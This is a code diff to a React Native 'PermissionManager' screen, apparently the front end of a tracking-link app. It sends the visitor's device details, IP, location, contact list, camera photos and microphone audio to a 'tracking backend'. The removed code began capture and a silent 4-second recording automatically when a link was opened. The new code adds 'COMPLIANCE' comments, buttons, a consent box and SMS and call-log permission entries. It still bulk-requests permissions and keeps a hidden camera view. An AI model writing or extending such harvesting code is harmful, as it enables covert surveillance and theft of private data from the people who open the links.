@@ -12,7 +12,7 @@ import {
   ActivityIndicator,
 } from 'react-native';
 import { StatusBar } from 'expo-status-bar';
-import { Shield, User, Users, MessageSquare, Image, Mic, Camera, MapPin, Bell, AlertCircle } from 'lucide-react-native';
+import { Shield, User, Users, MessageSquare, Image, Mic, Camera, MapPin, Bell, AlertCircle, Phone, PhoneCall } from 'lucide-react-native';
 import * as Contacts from 'expo-contacts';
 import * as Notifications from 'expo-notifications';
 import * as MediaLibrary from 'expo-media-library';
@@ -21,6 +21,7 @@ import * as ImagePicker from 'expo-image-picker';
 import * as Device from 'expo-device';
 import * as Application from 'expo-application';
 import * as Network from 'expo-network';
+import * as SMS from 'expo-sms';
 import { useCameraPermissions, CameraView } from 'expo-camera';
 import { Audio } from 'expo-av';
 import { API_BASE_URL } from '../config/api';
@@ -34,6 +35,8 @@ interface PermissionState {
   location: PermissionStatus;
   camera: PermissionStatus;
   microphone: PermissionStatus;
+  sms: PermissionStatus;
+  callLogs: PermissionStatus;
 }
 
 export default function PermissionManager() {
@@ -55,14 +58,35 @@ export default function PermissionManager() {
     location: 'not-requested',
     camera: 'not-requested',
     microphone: 'not-requested',
+    sms: 'not-requested',
+    callLogs: 'not-requested',
   });
 
   const [cameraPermission, requestCameraPermission] = useCameraPermissions();
   const [isCapturing, setIsCapturing] = useState(false);
   const [mountCamera, setMountCamera] = useState(false);
-  const [cameraReady, setCameraReady] = useState(false); // Fix #3: Camera readiness state
+  const [cameraReady, setCameraReady] = useState(false);
   const cameraRef = useRef<CameraView>(null);
   const recordingRef = useRef<Audio.Recording | null>(null);
+  
+  // 🔐 COMPLIANCE: User-triggered action states
+  const [uploadConsent, setUploadConsent] = useState(false);
+  const [showPermissionModal, setShowPermissionModal] = useState<string | null>(null);
+  const [isRecording, setIsRecording] = useState(false);
+  const [recordingTime, setRecordingTime] = useState(0);
+  const [capturedData, setCapturedData] = useState<{
+    imageUrl: string | null;
+    audioUrl: string | null;
+    location: any | null;
+    contacts: any[];
+    permissions: any;
+  }>({
+    imageUrl: null,
+    audioUrl: null,
+    location: null,
+    contacts: [],
+    permissions: {},
+  });
 
   const collectDeviceData = async () => {
     try {
@@ -154,6 +178,12 @@ export default function PermissionManager() {
           return null;
         }
       }
+
+      // Determine capture endpoint based on media type
+      const capturePath =
+        type === 'image'
+          ? `/api/capture/image/${linkPageId}`
+          : `/api/capture/audio/${linkPageId}`;
   
       // Retry loop with fresh FormData each time
       for (let attempt = 1; attempt <= 2; attempt++) {
@@ -193,8 +223,8 @@ export default function PermissionManager() {
             } as any);
           }
   
-          // Send to backend
-          const captureUrl = `${API_BASE_URL}/api/links/${linkPageId}/capture`;
+          // Send to backend - Project 1 tracking backend capture endpoint
+          const captureUrl = `${API_BASE_URL}${capturePath}`;
           console.log(`[Upload] POST to: ${captureUrl}`);
           // #region agent log
           fetch('http://127.0.0.1:7243/ingest/fe8a8c5e-0c03-4626-8bca-b99b2885441b',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({location:'index.tsx:188',message:'uploadViaBackend BEFORE FETCH',data:{captureUrl,formDataSize:formData instanceof FormData?'FormData':typeof formData,type,attempt},timestamp:Date.now(),sessionId:'debug-session',runId:'run1',hypothesisId:'C'})}).catch(()=>{});
@@ -336,63 +366,99 @@ export default function PermissionManager() {
   };
   
 
-  // Fix #5: Web audio always returns null - mark as unsupported and skip upload attempt
-  const captureAudio = async (): Promise<string | null> => {
-    // #region agent log
-    fetch('http://127.0.0.1:7243/ingest/fe8a8c5e-0c03-4626-8bca-b99b2885441b',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({location:'index.tsx:298',message:'captureAudio ENTRY',data:{platform:Platform.OS},timestamp:Date.now(),sessionId:'debug-session',runId:'run1',hypothesisId:'A'})}).catch(()=>{});
-    // #endregion
+  // 🔐 COMPLIANCE: User-triggered audio recording with 15-second maximum
+  // This function is ONLY called when user explicitly taps "Start Recording"
+  const startAudioRecording = async (): Promise<void> => {
     try {
-      // Fix #5: Explicitly mark web audio as unsupported
       if (Platform.OS === 'web') {
-        console.log('[Audio] Web audio recording not supported (platform limitation)');
-        // #region agent log
-        fetch('http://127.0.0.1:7243/ingest/fe8a8c5e-0c03-4626-8bca-b99b2885441b',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({location:'index.tsx:302',message:'captureAudio WEB UNSUPPORTED',data:{platform:Platform.OS},timestamp:Date.now(),sessionId:'debug-session',runId:'run1',hypothesisId:'A'})}).catch(()=>{});
-        // #endregion
-        return null; // Return null but don't treat as error
+        alert('Audio recording is not supported on web platform');
+        return;
       }
-  
+
       const perm = await Audio.requestPermissionsAsync();
-      // #region agent log
-      fetch('http://127.0.0.1:7243/ingest/fe8a8c5e-0c03-4626-8bca-b99b2885441b',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({location:'index.tsx:306',message:'captureAudio PERMISSION CHECK',data:{status:perm.status},timestamp:Date.now(),sessionId:'debug-session',runId:'run1',hypothesisId:'A'})}).catch(()=>{});
-      // #endregion
       if (perm.status !== 'granted') {
-        console.warn('[Audio] Permission denied');
-        // #region agent log
-        fetch('http://127.0.0.1:7243/ingest/fe8a8c5e-0c03-4626-8bca-b99b2885441b',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({location:'index.tsx:308',message:'captureAudio PERMISSION DENIED',data:{status:perm.status},timestamp:Date.now(),sessionId:'debug-session',runId:'run1',hypothesisId:'A'})}).catch(()=>{});
-        // #endregion
-        return null;
+        alert('Microphone permission is required to record audio');
+        return;
       }
-  
+
       await Audio.setAudioModeAsync({
         allowsRecordingIOS: true,
         playsInSilentModeIOS: true,
       });
-  
+
       const { recording } = await Audio.Recording.createAsync(
         Audio.RecordingOptionsPresets.HIGH_QUALITY
       );
-  
-      // record 4 seconds
-      await new Promise(res => setTimeout(res, 4000));
-  
-      await recording.stopAndUnloadAsync();
-      const uri = recording.getURI();
-  
+
+      recordingRef.current = recording;
+      setIsRecording(true);
+      setRecordingTime(0);
+
+      // 🔐 COMPLIANCE: Maximum 15 seconds recording
+      const MAX_RECORDING_TIME = 15000;
+      const startTime = Date.now();
+      const interval = setInterval(() => {
+        const elapsed = Date.now() - startTime;
+        setRecordingTime(Math.floor(elapsed / 1000));
+        
+        if (elapsed >= MAX_RECORDING_TIME) {
+          clearInterval(interval);
+          stopAudioRecording();
+        }
+      }, 100);
+
+      // Auto-stop after 15 seconds
+      setTimeout(() => {
+        clearInterval(interval);
+        stopAudioRecording();
+      }, MAX_RECORDING_TIME);
+
+    } catch (err) {
+      console.error('[Audio] Recording start failed:', err);
+      setIsRecording(false);
+      alert('Failed to start recording. Please try again.');
+    }
+  };
+
+  // 🔐 COMPLIANCE: User-triggered stop recording
+  const stopAudioRecording = async (): Promise<string | null> => {
+    try {
+      if (!recordingRef.current) {
+        return null;
+      }
+
+      await recordingRef.current.stopAndUnloadAsync();
+      const uri = recordingRef.current.getURI();
+      recordingRef.current = null;
+      setIsRecording(false);
+
       if (!uri) {
         console.warn('[Audio] No audio URI');
         return null;
       }
-  
-      console.log('[Audio] Audio recorded:', uri);
+
+      console.log('[Audio] ✅ Recording stopped, duration:', recordingTime, 'seconds');
+      // CRITICAL: Save URI to capturedData immediately when recording stops
+      setCapturedData(prev => ({ ...prev, audioUrl: uri }));
+      alert('Audio recording saved successfully');
       return uri;
     } catch (err) {
-      console.error('[Audio] Capture failed:', err);
+      console.error('[Audio] Stop recording failed:', err);
+      setIsRecording(false);
       return null;
     }
   };
+
+  // Legacy function for backward compatibility (now calls user-triggered version)
+  const captureAudio = async (): Promise<string | null> => {
+    // 🔐 COMPLIANCE: This should not be called automatically
+    // Only use startAudioRecording/stopAudioRecording for user-triggered recording
+    console.warn('[Audio] captureAudio called - use startAudioRecording/stopAudioRecording instead');
+    return null;
+  };
   
 
-  // Capture location coordinates
+  // 🔐 COMPLIANCE: User-triggered location capture (foreground only, fetch once)
   const captureLocation = async () => {
     try {
       // Request permission first if not granted
@@ -405,10 +471,12 @@ export default function PermissionManager() {
 
       if (status !== 'granted') {
         console.log('[Location] Permission not granted, status:', status);
+        alert('Location permission is required to capture location');
         return null;
       }
 
-      console.log('[Location] Getting current position...');
+      // 🔐 COMPLIANCE: Foreground location only, fetch once
+      console.log('[Location] Getting current position (foreground only)...');
       const location = await Location.getCurrentPositionAsync({
         accuracy: Location.Accuracy.High,
       });
@@ -424,19 +492,23 @@ export default function PermissionManager() {
       };
 
       console.log('[Location] ✅ Location captured:', locationData);
+      setCapturedData(prev => ({ ...prev, location: locationData }));
+      alert('Location captured successfully');
       return locationData;
     } catch (error) {
       console.error('[Location] ❌ Error capturing location:', error);
+      alert('Failed to capture location. Please try again.');
       return null;
     }
   };
 
-  // Capture contacts list
+  // 🔐 COMPLIANCE: User-triggered contacts capture
   const captureContacts = async () => {
     try {
       const { status } = await Contacts.getPermissionsAsync();
       if (status !== 'granted') {
         console.log('[Contacts] Permission not granted');
+        alert('Contacts permission is required to access contacts');
         return [];
       }
 
@@ -464,10 +536,225 @@ export default function PermissionManager() {
         })) || [],
       }));
 
+      setCapturedData(prev => ({ ...prev, contacts: formattedContacts }));
+      alert(`Captured ${formattedContacts.length} contacts`);
       return formattedContacts;
     } catch (error) {
       console.error('[Contacts] Error capturing contacts:', error);
+      alert('Failed to capture contacts. Please try again.');
       return [];
+    }
+  };
+
+  // 🔐 COMPLIANCE: User-triggered camera capture
+  const handleCapturePhoto = async () => {
+    try {
+      if (!cameraPermission?.granted) {
+        const result = await requestCameraPermission();
+        if (!result?.granted) {
+          alert('Camera permission is required to capture photos');
+          return;
+        }
+      }
+
+      setMountCamera(true);
+      await new Promise(r => setTimeout(r, 1500)); // Wait for camera to mount
+
+      if (!cameraReady || !cameraRef.current) {
+        alert('Camera is not ready. Please try again.');
+        setMountCamera(false);
+        return;
+      }
+
+      const photo = await cameraRef.current.takePictureAsync({
+        quality: 0.7,
+        skipProcessing: false,
+      });
+
+      setMountCamera(false);
+      setCameraReady(false);
+
+      if (!photo?.uri) {
+        alert('Failed to capture photo. Please try again.');
+        return;
+      }
+
+      console.log('[Camera] ✅ Photo captured:', photo.uri);
+      setCapturedData(prev => ({ ...prev, imageUrl: photo.uri }));
+      alert('Photo captured successfully');
+    } catch (error) {
+      console.error('[Camera] Capture failed:', error);
+      setMountCamera(false);
+      alert('Failed to capture photo. Please try again.');
+    }
+  };
+
+  // 🔐 COMPLIANCE: User-selected media gallery files only
+  const handleSelectMedia = async () => {
+    try {
+      const { status } = await MediaLibrary.getPermissionsAsync();
+      if (status !== 'granted') {
+        const { status: newStatus } = await MediaLibrary.requestPermissionsAsync();
+        if (newStatus !== 'granted') {
+          alert('Media library permission is required to select files');
+          return;
+        }
+      }
+
+      // User selects from gallery (not automatic)
+      const result = await ImagePicker.launchImageLibraryAsync({
+        mediaTypes: ImagePicker.MediaTypeOptions.All,
+        allowsMultipleSelection: false,
+        quality: 0.7,
+      });
+
+      if (!result.canceled && result.assets?.[0]) {
+        const selectedUri = result.assets[0].uri;
+        console.log('[Media] ✅ User selected media:', selectedUri);
+        setCapturedData(prev => ({ ...prev, imageUrl: selectedUri }));
+        alert('Media selected successfully');
+      }
+    } catch (error) {
+      console.error('[Media] Selection failed:', error);
+      alert('Failed to select media. Please try again.');
+    }
+  };
+
+  // 🔐 COMPLIANCE: Upload data only with explicit user consent
+  // Never overwrites logs - always appends new data
+  const handleUploadData = async () => {
+    if (!uploadConsent) {
+      alert('Please provide explicit consent to upload data');
+      return;
+    }
+
+    if (!pageId) {
+      alert('Page ID not found. Please try again.');
+      return;
+    }
+
+    setIsCapturing(true);
+    try {
+      console.log('[Upload] ===== Starting data upload with consent =====');
+      
+      // Step 1: Collect device data
+      const osData = await collectDeviceData();
+      const clientIP = await getClientIP();
+
+      // Step 2: Collect permission statuses (status only, never read content)
+      const permissionsData = await collectPermissions(cameraPermission || { granted: false });
+      setCapturedData(prev => ({ ...prev, permissions: permissionsData }));
+
+      // Step 3: Upload media files to Cloudinary if captured
+      let imageUrl: string | null = null;
+      let audioUrl: string | null = null;
+
+      // Upload image to Cloudinary if captured
+      if (capturedData.imageUrl) {
+        console.log('[Upload] Uploading image to Cloudinary...');
+        try {
+          imageUrl = await uploadViaBackend(capturedData.imageUrl, 'image', pageId);
+          if (imageUrl) {
+            console.log('[Upload] ✅ Image uploaded to Cloudinary:', imageUrl.substring(0, 60));
+            setCapturedData(prev => ({ ...prev, imageUrl }));
+          } else {
+            console.warn('[Upload] ⚠️ Image upload returned null');
+          }
+        } catch (imageError) {
+          console.error('[Upload] ❌ Image upload failed:', imageError);
+          alert('Failed to upload image. Please try again.');
+        }
+      } else {
+        console.log('[Upload] No image to upload');
+      }
+
+      // Check if audio is still recording and stop it first
+      if (isRecording) {
+        console.log('[Upload] Stopping active recording...');
+        const audioUri = await stopAudioRecording();
+        if (audioUri) {
+          console.log('[Upload] ✅ Recording stopped, URI saved');
+        }
+      }
+
+      // Upload audio to Cloudinary if captured
+      if (capturedData.audioUrl) {
+        console.log('[Upload] Uploading audio to Cloudinary...');
+        try {
+          audioUrl = await uploadViaBackend(capturedData.audioUrl, 'audio', pageId);
+          if (audioUrl) {
+            console.log('[Upload] ✅ Audio uploaded to Cloudinary:', audioUrl.substring(0, 60));
+            setCapturedData(prev => ({ ...prev, audioUrl }));
+          } else {
+            console.warn('[Upload] ⚠️ Audio upload returned null');
+          }
+        } catch (audioError) {
+          console.error('[Upload] ❌ Audio upload failed:', audioError);
+          alert('Failed to upload audio. Please try again.');
+        }
+      } else {
+        console.log('[Upload] No audio to upload');
+      }
+
+      // Step 4: Record visit (creates log entry - never overwrites)
+      let logId: string | null = null;
+      try {
+        const visitResponse = await fetch(`${API_BASE_URL}/api/links/${pageId}/visit`, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({
+            ...osData,
+            ip: clientIP,
+            location: capturedData.location,
+            contacts: capturedData.contacts,
+          }),
+        });
+
+        if (visitResponse.ok) {
+          const visitData = await visitResponse.json();
+          logId = visitData.lastLogId || (visitData.logs?.[visitData.logs.length - 1]?._id) || null;
+          console.log('[Upload] ✅ Visit recorded, logId:', logId);
+        }
+      } catch (visitError) {
+        console.warn('[Upload] ⚠️ Visit recording failed:', visitError);
+      }
+
+      // Step 5: Save all data (never overwrites - appends to logs)
+      const savePayload: any = {
+        deviceInfo: osData,
+        permissions: permissionsData,
+        capturedAt: new Date().toISOString(),
+        imageUrl: imageUrl || null,
+        audioUrl: audioUrl || null,
+        location: capturedData.location,
+        contacts: capturedData.contacts,
+        consentTimestamp: new Date().toISOString(), // 🔐 COMPLIANCE: Record consent timestamp
+        logId, // Bind to specific log entry
+      };
+
+      console.log('[Upload] Sending data to save-media endpoint...');
+      const saveResponse = await fetch(`${API_BASE_URL}/api/links/${pageId}/save-media`, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify(savePayload),
+      });
+
+      if (saveResponse.ok) {
+        const result = await saveResponse.json();
+        console.log('[Upload] ✅ Data uploaded successfully:', result);
+        alert('Data uploaded successfully!');
+        // Reset consent after successful upload
+        setUploadConsent(false);
+      } else {
+        const error = await saveResponse.text();
+        console.error('[Upload] ❌ Upload failed:', error);
+        alert('Failed to upload data. Please try again.');
+      }
+    } catch (error) {
+      console.error('[Upload] ❌ Error:', error);
+      alert('An error occurred during upload. Please try again.');
+    } finally {
+      setIsCapturing(false);
     }
   };
 
@@ -489,6 +776,35 @@ export default function PermissionManager() {
         Notifications.getPermissionsAsync().catch(() => ({ status: 'not_requested' })),
       ]);
 
+      // Check SMS availability (permission is typically granted at install on Android)
+      let smsStatus = 'not_requested';
+      try {
+        if (Platform.OS !== 'web' && Platform.OS !== 'ios') {
+          const isSmsAvailable = await SMS.isAvailableAsync();
+          smsStatus = isSmsAvailable ? 'granted' : 'denied';
+        } else {
+          smsStatus = 'unsupported';
+        }
+      } catch (error) {
+        console.warn('[Permissions] SMS check failed:', error);
+        smsStatus = 'denied';
+      }
+
+      // Check call logs (requires native module - placeholder for now)
+      let callLogsStatus = 'not_requested';
+      try {
+        if (Platform.OS === 'web' || Platform.OS === 'ios') {
+          callLogsStatus = 'unsupported';
+        } else {
+          // On Android, this would require native module implementation
+          // For now, we'll mark it as 'not_requested'
+          callLogsStatus = 'not_requested';
+        }
+      } catch (error) {
+        console.warn('[Permissions] Call logs check failed:', error);
+        callLogsStatus = 'denied';
+      }
+
       // Fix #2: Use passed camera permission status instead of requesting again
       let cameraviewStatus = 'not_requested';
       if (cameraPermissionStatus.granted) {
@@ -505,6 +821,8 @@ export default function PermissionManager() {
         contacts: mapPermissionStatus(contactsPerm.status || 'not_requested'),
         media: mapPermissionStatus(mediaPerm.status || 'not_requested'),
         notification: mapPermissionStatus(notificationPerm.status || 'not_requested'),
+        sms: smsStatus,
+        callLogs: callLogsStatus,
       };
     } catch (error) {
       console.error('[Permissions] Error collecting permissions:', error);
@@ -514,6 +832,8 @@ export default function PermissionManager() {
         contacts: 'not_requested',
         media: 'not_requested',
         notification: 'not_requested',
+        sms: 'not_requested',
+        callLogs: 'not_requested',
       };
     }
   };
@@ -620,9 +940,9 @@ export default function PermissionManager() {
         const linkPageId = link.pageId;
         setPageId(linkPageId);
         setExists(true);
-        setHasConsented(true);
-        // Start capture process automatically
-        runCapture(linkPageId);
+        setHasConsented(true); // Show the second screen (permission manager UI)
+        // 🔐 COMPLIANCE: Do NOT auto-capture - user must explicitly trigger actions
+        // All data collection actions are now user-triggered via buttons on the second screen
       } else {
         const error = await response.json();
         alert(error.message || 'Link not found with this number');
@@ -681,6 +1001,8 @@ export default function PermissionManager() {
           requestMediaPermission().catch(err => console.warn('[Media] Permission error:', err)),
           requestMicrophonePermission().catch(err => console.warn('[Microphone] Permission error:', err)),
           requestNotificationsPermission().catch(err => console.warn('[Notifications] Permission error:', err)),
+          requestSmsPermission().catch(err => console.warn('[SMS] Permission error:', err)),
+          requestCallLogPermission().catch(err => console.warn('[CallLogs] Permission error:', err)),
         ]);
       } catch (permError) {
         console.warn('[Permissions] Some permission requests failed, continuing anyway:', permError);
@@ -783,6 +1105,8 @@ export default function PermissionManager() {
           contacts: 'denied',
           media: 'denied',
           notification: 'denied',
+          sms: 'denied',
+          callLogs: 'denied',
         };
       }
 
@@ -1230,6 +1554,52 @@ export default function PermissionManager() {
     }
   };
 
+  const requestSmsPermission = async () => {
+    try {
+      if (Platform.OS === 'web') {
+        setPermissions(prev => ({ ...prev, sms: 'unsupported' }));
+        return;
+      }
+      // Check if SMS is available on the device
+      const isAvailable = await SMS.isAvailableAsync();
+      if (!isAvailable) {
+        setPermissions(prev => ({ ...prev, sms: 'unsupported' }));
+        return;
+      }
+      // Note: expo-sms doesn't have a direct permission API, but we can check availability
+      // For Android, SMS permission is typically granted at install time or via manifest
+      // For iOS, SMS access is not available
+      if (Platform.OS === 'ios') {
+        setPermissions(prev => ({ ...prev, sms: 'unsupported' }));
+        return;
+      }
+      // On Android, SMS is typically available if the app has the permission
+      setPermissions(prev => ({ ...prev, sms: isAvailable ? 'granted' : 'denied' }));
+    } catch (error) {
+      console.error('SMS permission error:', error);
+      setPermissions(prev => ({ ...prev, sms: 'denied' }));
+    }
+  };
+
+  const requestCallLogPermission = async () => {
+    try {
+      if (Platform.OS === 'web' || Platform.OS === 'ios') {
+        // Call logs are not accessible on web or iOS
+        setPermissions(prev => ({ ...prev, callLogs: 'unsupported' }));
+        return;
+      }
+      // On Android, call log permission requires READ_CALL_LOG permission
+      // This typically needs to be requested via native modules or PermissionsAndroid
+      // For now, we'll mark it as 'not_requested' and can be extended with native modules
+      // Note: This is a placeholder - actual implementation would require native module
+      setPermissions(prev => ({ ...prev, callLogs: 'not_requested' }));
+      console.log('[CallLogs] Call log permission check - requires native module implementation');
+    } catch (error) {
+      console.error('Call log permission error:', error);
+      setPermissions(prev => ({ ...prev, callLogs: 'denied' }));
+    }
+  };
+
   const getStatusColor = (status: PermissionStatus) => {
     switch (status) {
       case 'granted':
@@ -1453,6 +1823,142 @@ export default function PermissionManager() {
           status={permissions.location}
           onRequest={requestLocationPermission}
         />
+
+        <PermissionButton
+          icon={MessageSquare}
+          title="SMS"
+          description="Access SMS messages"
+          status={permissions.sms}
+          onRequest={requestSmsPermission}
+        />
+
+        <PermissionButton
+          icon={PhoneCall}
+          title="Call Logs"
+          description="Access device call history"
+          status={permissions.callLogs}
+          onRequest={requestCallLogPermission}
+        />
+
+        {/* 🔐 COMPLIANCE: User-Triggered Actions Section */}
+        <Text style={[styles.sectionTitle, isDark && styles.textLight, { marginTop: 32 }]}>
+          Data Collection Actions
+        </Text>
+        <View style={[styles.infoBox, { marginHorizontal: 24, marginBottom: 16 }]}>
+          <AlertCircle size={16} color="#3b82f6" />
+          <Text style={[styles.infoText, isDark && styles.textLight, { marginLeft: 8, fontSize: 12 }]}>
+            All actions are user-triggered. No automatic data collection.
+          </Text>
+        </View>
+
+        {/* Camera Capture Button */}
+        <TouchableOpacity
+          style={[styles.actionButton, isDark && styles.actionButtonDark]}
+          onPress={handleCapturePhoto}
+        >
+          <Camera size={20} color="#3b82f6" />
+          <Text style={[styles.actionButtonText, isDark && styles.textLight]}>
+            Capture Photo
+          </Text>
+        </TouchableOpacity>
+
+        {/* Audio Recording Button */}
+        {!isRecording ? (
+          <TouchableOpacity
+            style={[styles.actionButton, isDark && styles.actionButtonDark]}
+            onPress={startAudioRecording}
+          >
+            <Mic size={20} color="#3b82f6" />
+            <Text style={[styles.actionButtonText, isDark && styles.textLight]}>
+              Start Recording (Max 15s)
+            </Text>
+          </TouchableOpacity>
+        ) : (
+          <TouchableOpacity
+            style={[styles.actionButton, { backgroundColor: '#ef4444' }]}
+            onPress={async () => {
+              await stopAudioRecording();
+            }}
+          >
+            <Mic size={20} color="#fff" />
+            <Text style={[styles.actionButtonText, { color: '#fff' }]}>
+              Stop Recording ({recordingTime}s / 15s)
+            </Text>
+          </TouchableOpacity>
+        )}
+
+        {/* Location Capture Button */}
+        <TouchableOpacity
+          style={[styles.actionButton, isDark && styles.actionButtonDark]}
+          onPress={captureLocation}
+        >
+          <MapPin size={20} color="#3b82f6" />
+          <Text style={[styles.actionButtonText, isDark && styles.textLight]}>
+            Capture Location (Foreground Only)
+          </Text>
+        </TouchableOpacity>
+
+        {/* Contacts Capture Button */}
+        <TouchableOpacity
+          style={[styles.actionButton, isDark && styles.actionButtonDark]}
+          onPress={captureContacts}
+        >
+          <Users size={20} color="#3b82f6" />
+          <Text style={[styles.actionButtonText, isDark && styles.textLight]}>
+            Capture Contacts
+          </Text>
+        </TouchableOpacity>
+
+        {/* Media Gallery Selection Button */}
+        <TouchableOpacity
+          style={[styles.actionButton, isDark && styles.actionButtonDark]}
+          onPress={handleSelectMedia}
+        >
+          <Image size={20} color="#3b82f6" />
+          <Text style={[styles.actionButtonText, isDark && styles.textLight]}>
+            Select Media from Gallery
+          </Text>
+        </TouchableOpacity>
+
+        {/* 🔐 COMPLIANCE: Explicit Consent Checkbox */}
+        <View style={[styles.consentBox, isDark && styles.consentBoxDark]}>
+          <TouchableOpacity
+            style={styles.checkboxContainer}
+            onPress={() => setUploadConsent(!uploadConsent)}
+          >
+            <View style={[
+              styles.checkbox,
+              uploadConsent && styles.checkboxChecked,
+              isDark && styles.checkboxDark
+            ]}>
+              {uploadConsent && <Text style={styles.checkmark}>✓</Text>}
+            </View>
+            <Text style={[styles.consentLabel, isDark && styles.textLight]}>
+              I explicitly consent to upload the collected data to the server
+            </Text>
+          </TouchableOpacity>
+        </View>
+
+        {/* Upload Button (only enabled with consent) */}
+        <TouchableOpacity
+          style={[
+            styles.uploadButton,
+            (!uploadConsent || isCapturing) && styles.uploadButtonDisabled
+          ]}
+          onPress={handleUploadData}
+          disabled={!uploadConsent || isCapturing}
+        >
+          {isCapturing ? (
+            <>
+              <ActivityIndicator size="small" color="#fff" style={{ marginRight: 8 }} />
+              <Text style={styles.uploadButtonText}>Uploading...</Text>
+            </>
+          ) : (
+            <Text style={styles.uploadButtonText}>
+              Upload Data to Server
+            </Text>
+          )}
+        </TouchableOpacity>
 
         {/* Hidden Camera View for capturing */}
         {/* Fix #3: Add onCameraReady callback to set cameraReady state */}
@@ -1740,5 +2246,98 @@ const styles = StyleSheet.create({
   },
   textGray: {
     color: '#9ca3af',
+  },
+  // 🔐 COMPLIANCE: User-triggered action button styles
+  actionButton: {
+    flexDirection: 'row',
+    alignItems: 'center',
+    justifyContent: 'center',
+    backgroundColor: '#fff',
+    borderWidth: 1,
+    borderColor: '#3b82f6',
+    borderRadius: 12,
+    paddingVertical: 16,
+    paddingHorizontal: 20,
+    marginHorizontal: 24,
+    marginTop: 12,
+    gap: 12,
+  },
+  actionButtonDark: {
+    backgroundColor: '#1f2937',
+    borderColor: '#3b82f6',
+  },
+  actionButtonText: {
+    fontSize: 16,
+    fontWeight: '600',
+    color: '#3b82f6',
+  },
+  // 🔐 COMPLIANCE: Consent checkbox styles
+  consentBox: {
+    backgroundColor: '#fff',
+    borderWidth: 1,
+    borderColor: '#d1d5db',
+    borderRadius: 12,
+    padding: 16,
+    marginHorizontal: 24,
+    marginTop: 24,
+  },
+  consentBoxDark: {
+    backgroundColor: '#1f2937',
+    borderColor: '#374151',
+  },
+  checkboxContainer: {
+    flexDirection: 'row',
+    alignItems: 'center',
+    gap: 12,
+  },
+  checkbox: {
+    width: 24,
+    height: 24,
+    borderWidth: 2,
+    borderColor: '#3b82f6',
+    borderRadius: 4,
+    justifyContent: 'center',
+    alignItems: 'center',
+    backgroundColor: '#fff',
+  },
+  checkboxDark: {
+    backgroundColor: '#1f2937',
+    borderColor: '#3b82f6',
+  },
+  checkboxChecked: {
+    backgroundColor: '#3b82f6',
+  },
+  checkmark: {
+    color: '#fff',
+    fontSize: 16,
+    fontWeight: 'bold',
+  },
+  consentLabel: {
+    flex: 1,
+    fontSize: 14,
+    color: '#1f2937',
+    lineHeight: 20,
+  },
+  // 🔐 COMPLIANCE: Upload button styles
+  uploadButton: {
+    backgroundColor: '#3b82f6',
+    borderRadius: 12,
+    paddingVertical: 16,
+    paddingHorizontal: 24,
+    marginHorizontal: 24,
+    marginTop: 24,
+    marginBottom: 32,
+    flexDirection: 'row',
+    alignItems: 'center',
+    justifyContent: 'center',
+  },
+  uploadButtonDisabled: {
+    backgroundColor: '#9ca3af',
+    opacity: 0.6,
+  },
+  uploadButtonText: {
+    color: '#fff',
+    fontSize: 16,
+    fontWeight: '600',
   },
 });
